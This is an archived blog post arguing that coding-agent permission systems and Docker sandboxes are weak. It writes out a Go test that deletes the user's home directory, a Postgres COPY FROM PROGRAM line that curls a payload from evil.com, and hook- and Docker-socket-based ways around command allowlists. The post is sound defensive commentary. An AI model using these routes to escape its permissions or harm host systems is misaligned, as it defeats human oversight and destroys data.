@@ -1,0 +1,142 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Why sandboxing coding agents is harder than you think | rss-cache archive</title>
+    <style>
+      :root {
+        color-scheme: light;
+        --bg: #f6f2ea;
+        --card: #fffdfa;
+        --text: #1f2933;
+        --muted: #52606d;
+        --border: #d9cbb8;
+        --accent: #b05a33;
+      }
+      * { box-sizing: border-box; }
+      body {
+        margin: 0;
+        font-family: Georgia, "Iowan Old Style", "Palatino Linotype", serif;
+        color: var(--text);
+        background: linear-gradient(180deg, #fbf8f2 0%, var(--bg) 100%);
+      }
+      main {
+        max-width: 820px;
+        margin: 0 auto;
+        padding: 2.5rem 1.25rem 4rem;
+      }
+      article {
+        background: var(--card);
+        border: 1px solid var(--border);
+        border-radius: 20px;
+        padding: 1.5rem;
+      }
+      h1 {
+        margin-top: 0;
+        font-size: clamp(2rem, 4vw, 3rem);
+        line-height: 1.05;
+      }
+      .meta {
+        color: var(--muted);
+        margin-bottom: 1.2rem;
+      }
+      .links {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 0.75rem;
+        margin-bottom: 1.5rem;
+      }
+      .links a {
+        color: var(--accent);
+        text-decoration: none;
+      }
+      .summary {
+        border-left: 4px solid var(--border);
+        padding-left: 1rem;
+        color: var(--muted);
+        margin-bottom: 1.5rem;
+      }
+      img {
+        max-width: 100%;
+        height: auto;
+      }
+      pre {
+        white-space: pre-wrap;
+        overflow-wrap: anywhere;
+      }
+      a {
+        color: var(--accent);
+      }
+    </style>
+  </head>
+  <body>
+    <main>
+      <article>
+        <h1>Why sandboxing coding agents is harder than you think</h1>
+        <div class="meta">Martin Alderson 2026-01-19T00:00:00Z</div>
+        <div class="links">
+          <a href="https://martinalderson.com/posts/why-sandboxing-coding-agents-is-harder-than-you-think/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=feed">Original article</a>
+          <a href="https://ThinkPeace.github.io/rss-cache/archive/articles/martinalderson-com/martinalderson-com-44f3c69b228e7615.json">Archive JSON</a>
+          <a href="https://ThinkPeace.github.io/rss-cache/">rss-cache home</a>
+        </div>
+        <div class="summary">Permission systems, Docker sandboxing, and log file secrets - why current approaches to securing coding agents fall short and what we might need instead.</div>
+        <div class="content">
+          <p>While I've been blown away by the development in coding agents, I'm starting to get worried there are some quite serious security risks coming from them.</p>
+<p>I'm increasingly of the opinion that we need to reimagine the operating system itself a bit to cope with this - very similar to how iOS and Android in the smartphone arena had a very different permission, multitasking and background service approach to conventional &quot;desktop&quot; OSes.</p>
+<h2>Permission systems are too naïve</h2>
+<p>A common pattern for restricting coding agents is to allow them to only execute certain commands automatically. For example, you may allow it to do a <code>git add</code> and <code>git commit</code> automatically, but restrict <code>git push</code> or <code>git merge</code> operations.</p>
+<p>While this makes a lot of sense (and it is a pattern I use a lot), I think there is a serious problem in that somewhat &quot;innocuous&quot; commands like <code>dotnet test</code> or <code>go test</code> can end up doing much more than that.</p>
+<p>Imagine a coding agent has the task of fixing a bug. It finds out that disk space is low, so it (wrongly!) decides the best course of action is to clear the users home directory to make space. Now, you have sensibly restricted the coding agent to a very minimal set of commands - perhaps read/write (in the project folder) and <code>go build</code> and <code>go test</code>.</p>
+<p>The difficulty is if it wanted to, it could simply create a new go test file:</p>
+<pre><code class="language-golang">package main
+
+import (
+	&quot;os&quot;
+	&quot;testing&quot;
+)
+
+func TestCleanup(t *testing.T) {
+	homeDir, _ := os.UserHomeDir()
+	os.RemoveAll(homeDir)
+}
+</code></pre>
+<p>that does the exact same as <code>rm -rf ~</code>. It can now execute this simply by running <code>go test</code>.</p>
+<p>Equally, even <code>git</code> itself can execute arbitrary code via commit hooks. So it could just write to <code>.git/hooks/pre-commit</code> and then do the whitelisted <code>git commit</code> command - to give it full shell access.</p>
+<p>These are just examples. I imagine nearly every development tool you use day to day has similar &quot;permission escalation&quot; vectors.</p>
+<p>As such I think really <em>any</em> automatic tool execution in a non-sandboxed (e.g. Docker) environment is a big security risk. As models get better and better I think we'll start using these 'bypasses' more and more - not because they are being overtly malicious - but because they just want to get the job done!</p>
+<h2>But, Docker has issues too</h2>
+<p>I'm still worried that Dockerising the coding agent still has significant risks. Imagine you lock down your Docker container well, and restrict network access. However, you do give it access to your (firewalled) Postgres staging database instance so it can investigate issues/run tests, etc.</p>
+<p>All good right? Unfortunately not - it now has arbitrary code and network execution via COPY PROGRAM if you have given it superuser permissions by accident on the database server (I see this quite a lot - often the 'staging' user has <em>way</em> more permissions than it should - it's just staging after all!)</p>
+<pre><code class="language-sql">CREATE TABLE temp_payload (line text);
+COPY temp_payload FROM PROGRAM 'curl -s http://evil.com/payload.sh'; SELECT * FROM temp_payload;
+</code></pre>
+<p>Again, this is just an example off the top of my head - with a clever enough model, I'm sure they can figure out weird and wonderful ways to 'exploit' this functionality in any server you give it access to.</p>
+<p>Then there is also the problem of Docker itself. Often to run Docker-in-Docker, for example with TestContainers for tests, you spawn the Claude Code instance with</p>
+<pre><code class="language-bash">docker run -v /var/run/docker.sock:/var/run/docker.sock
+</code></pre>
+<p>The problem here is that socket effectively gives it elevated permissions on the host. If it wants, it can just spawn another container through that socket with full filesystem/network access.</p>
+<p>My recommendation on this is to instead use 'throwaway' VMs <strong>instead</strong> of Docker if you are concerned about security. This allows the agent to use Docker itself securely in the container without any worries.</p>
+<p>There's various micro VM options, but for local development I'd recommend just using <code>libvirt</code> with KVM. If you want faster startup, use <code>virsh save</code> and <code>virsh resume</code> to save a snapshot to an image at boot and then use that as the basis for each VM you want to spin up. On a fast machine with decent NVMes this takes seconds - it's not obviously slower than Docker in my experience, but with a far better security boundary if you need the agent to use Docker. This, however, does not rule out privilege escalation via a remote host it has access to.</p>
+<h2>Secrets in log files</h2>
+<p>Even a perfectly sandboxed agent creates a new problem: its logs. While the example above is really about protecting against &quot;accidental&quot; over eagerness from agents vs outright bad actors, I do have serious concerns about the log files that agents like Claude Code generate <em>and</em> most likely store on their end for audit and diagnostic purposes (even if not for training!).</p>
+<p>It occurred to me recently while I was building a bunch of <a href="https://martinalderson.com/posts/why-im-building-my-own-clis-for-agents/">CLIs</a> that I was pasting secrets in by accident more times than I'd like to admit. It's very easy to just copy and paste setup instructions and accidentally include a secret in it.</p>
+<p>This got me thinking - even being very careful, it's hard to avoid this completely. For example, a program crashes and in the stack trace accidentally leaks env variables. Or the agent... just reading your $ENV vars to diagnose a problem. Plus enabling trace logs often reveal secrets that you probably don't want to expose.</p>
+<p>These all end up in Claude Code's log directory and (I assume) in Anthropic's servers.</p>
+<p>As such I think these log files are becoming extremely high value targets - why bother doing complex attacks to grab secrets when you can just grab these log files and figure out the secrets from there.</p>
+<p>What would be great would be some auto-secret scrubbing from the log files (detecting common patterns and redacting them at a minimum), plus encrypting the local log files. Interestingly, Claude Code tells me off when I accidentally put a secret in the chat, but it doesn't tell itself off when it reads one by accident.</p>
+<h2>Vulnerability hunting at industrial scale</h2>
+<p>This is probably the one that concerns me the most. I found out a while ago it was <em>trivial</em> for LLMs to find exploits in &quot;niche&quot; open source projects I use. I didn't go too deep in this but it was very easy for it to find a DoS attack vector with virtually no effort or even rudimentary knowledge of the codebase from my part.</p>
+<p>Combined with their excellent skills in reverse engineering code, this is a true systemic risk that needs serious attention.</p>
+<p>I suspect bad actors already are using agents to find hundreds (thousands or more?) of vulnerabilities in open (and closed) source servers. The real risk imo isn't really from popular servers like sshd or nginx, but the huge long tail of weird and wonderful servers and applications.</p>
+<p>A lot of these (unlike say nginx) have very little attention on them. This in the past did mean that it was nearly pointless for bad actors to find vulnerabilities in them - why spend effort on a small project that maybe has a few hundred servers total when you can focus on higher value targets.</p>
+<p>There was a <a href="https://arxiv.org/abs/2512.09882">very interesting study</a> done showing that in some examples, agents were outcompeting humans in many pentesting tasks. This is a side effect of making models great at coding - they also become great at finding security weaknesses.</p>
+<p>Now I can definitely see a world where this long tail with agents becomes much more attractive. 100 exploits in 100 small apps = 10,000 targets.</p>
+<p>Equally agentic tools are going to be great at <em>fixing</em> these issues, but there's definitely going to be a lag between this proliferation of attacks and these tools being patched (if they even have a maintainer).</p>
+<p>The asymmetry has flipped. Finding vulnerabilities used to be expensive and exploiting them was cheap. Now both are cheap.</p>
+<p>Fundamentally agents are a new 'category' of software execution that I don't think maps well to most OS models. We tend to think of code as either malicious or trusted. Agents are neither. That's the problem.</p>
+        </div>
+      </article>
+    </main>
+  </body>
+</html>
